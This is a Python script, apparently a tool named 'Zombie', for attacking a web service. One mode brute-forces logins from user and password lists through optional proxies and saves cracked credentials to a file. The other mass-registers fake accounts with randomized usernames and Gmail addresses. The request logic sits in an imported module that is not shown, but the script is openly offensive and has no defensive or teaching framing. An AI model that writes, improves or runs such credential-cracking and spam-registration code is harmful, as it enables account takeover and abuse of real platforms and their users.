#!/usr/bin/python3

#########################################################
# Zombie - BA9CHICH Destruction                         # 
# Author - edgerunner0x01                               #
#########################################################

try:
    from time import sleep
    from colorama import init , Style
    from colorama import Fore
    import requests
    import datetime
    from subprocess import run
    from os import system
    import argparse
    import json
    from tools import *
    red=str(Fore.RED)
    green=str(Fore.GREEN)
    magenta=str(Fore.MAGENTA)
    yellow=str(Fore.YELLOW)
    from random import randint
    wk=run("pwd", shell=True,capture_output=True, text=1).stdout

except Exception as E:
    print("error: "+str(E))


def banner():
    banner=f"""{red}
    ▄███████▄   ▄██████▄    ▄▄▄▄███▄▄▄▄   ▀█████████▄   ▄█     ▄████████ 
    ██▀     ▄██ ███    ███ ▄██▀▀▀███▀▀▀██▄   ███    ███ ███    ███    ███ 
        ▄███▀ ███    ███ ███   ███   ███   ███    ███ ███▌   ███    █▀  
    ▀█▀▄███▀▄▄ ███    ███ ███   ███   ███  ▄███▄▄▄██▀  ███▌  ▄███▄▄▄     
    ▄███▀   ▀ ███    ███ ███   ███   ███ ▀▀███▀▀▀██▄  ███▌ ▀▀███▀▀▀     
    ▄███▀       ███    ███ ███   ███   ███   ███    ██▄ ███    ███    █▄  
    ███▄     ▄█ ███    ███ ███   ███   ███   ███    ███ ███    ███    ███ 
    ▀████████▀  ▀██████▀   ▀█   ███   █▀  ▄█████████▀  █▀     ██████████ 
    """
    print("\n"+banner+"\n")
    sleep(1)

def bruteforce():

    def check():
        attack=combo()
        print(f"{magenta}[!] Checking [SERVER] [{attack.url}] connectivity... ",end="")
        sleep(1)
        if(attack.check()):
            print(f"{green}[Done]")
            sleep(3)
        else:
            print(f"{red}Unknown Error !")
            exit()

    def launch(identifier,password,proxies):

        try:
            attack=combo()
            guess=attack.guess(identifier,password,proxies)
        except KeyboardInterrupt:
            exit()
        except Exception as E:
            print("error: "+E)

        if(guess):
            print(green+"Found match for [{}:{}] !".format(identifier,password), end="")
            
            with open("cracked_accounts.txt","a") as f:
                f.write(f"{identifier}:{password}\n")
            return True

        else:
            print(red+"No Match for [{}:{}] ".format(identifier,password),end="\r")
            return False


    identifiers_path=str(input("Users/Emails file path: "))
    passwords_path=str(input("Wordlist/Passwords file path: "))
    proxies_path=str(input("Proxies json file path: "))

    check()

    identifiers= []
    passwords = []
    proxies=None

    try:
        with open(identifiers_path,"r") as identifier_file:
            print(f"{green}[+] Using [Emails/Usernames] From [{identifiers_path}]")
            for identifier in identifier_file:
                identifiers.append(identifier.replace("\n",""))
        sleep(2)

        with open(passwords_path,"r") as passwords_file:
            print(f"{green}[+] Using [Passwords] From [{passwords_path}]")
            for password in passwords_file:
                passwords.append(password.replace("\n",""))
        sleep(2)

        print("")
        
        if(proxies_path !=None and proxies_path!="None" and proxies_path!=""):
            try:
                with open(proxies_path,"r") as proxies_file:
                    proxies_raw=proxies_file.read()
                    proxies_encoded=json.loads(proxies_raw)
                    proxies=proxies_encoded
                    print(f"{green}[+] Including [Proxies] ",end="\n\n")
                    sleep(1)
                    print(proxies_raw)

            
            except KeyboardInterrupt:
                exit()
            except Exception as E:
                pass
                print(f"{red}[!] Invalid Proxies file path ")
                exit()
        else:
            proxies=None
            print(f"{red}[-] Not Including [Proxies] ")
            pass
    except KeyboardInterrupt:
        pass
    except Exception as E :
        print(f"{red}error: {E}")



    try:
        sleep(1)
        time=datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{magenta}[+] Launching [BruteForce] - [{time}] ! \n")
        sleep(1)
        print(f"{green}[*] cracked accounts will be saved to "+str(wk)+"/cracked_accounts.txt")
        sleep(3)

        counter=1
        length=len(passwords)
        for identifier in identifiers:
            for password in passwords:
                time=datetime.datetime.now().strftime("%H:%M:%S")
                print(f"{magenta}[#] [{time}] ({counter}/{length}) " ,end="")
                if(launch(identifier,password,proxies)):
                    counter=1
                    break
                else:
                    counter+=1
                    continue
            print("")
            counter=1

    except KeyboardInterrupt:
        exit()
    except Exception as E:
        print(red+"error: "+E)


def spam_users():
    username=str(input("Username to spam: "))
    email=str(input("Email Name to use: "))
    password=str(input("Password to use:  "))
    length=int(input("Number of accounts to be created: "))
    spam=SpamUsers()
    wk=run("cd", shell=True,capture_output=True, text=1)
    try:
        print(f"{green}[+] Accounts will be saved at "+str(wk.stdout).replace("\n","")+"/created_accounts.txt")
        for i in range(length):
            usernamemod=username+str(randint(1,length)*randint(1,99+randint(1,100)))
            emailmod=email+str(randint(1,length)*randint(1,99)+randint(1,100))+"@gmail.com"      
            if spam.startSpam(usernamemod,emailmod,password):
                print(f"{green}[Added] [{i+1}/{length}] "+emailmod+" -> "+usernamemod+":"+password)
                with open("created_accounts.txt","a+") as f:
                    f.write(f"{usernamemod}:{emailmod}:{password}\n")
            else:
                print("error")
    except Exception as E:
        print("Error: "+str(E))
    except KeyboardInterrupt:
        exit



def main():
    exec=int(input(f"# Select (1/2) : \n\n\t{green}[1] Bruteforce/Crack Accounts \n\t{green}[2] Spam Fake Users registration\n{Style.RESET_ALL} > "))
    if exec == 1:
        bruteforce()
    elif exec == 2:
        spam_users()
    else:
        main()



if __name__=="__main__":
    try:
        init(autoreset=True)
        banner()
        main()
    except KeyboardInterrupt:
        exit
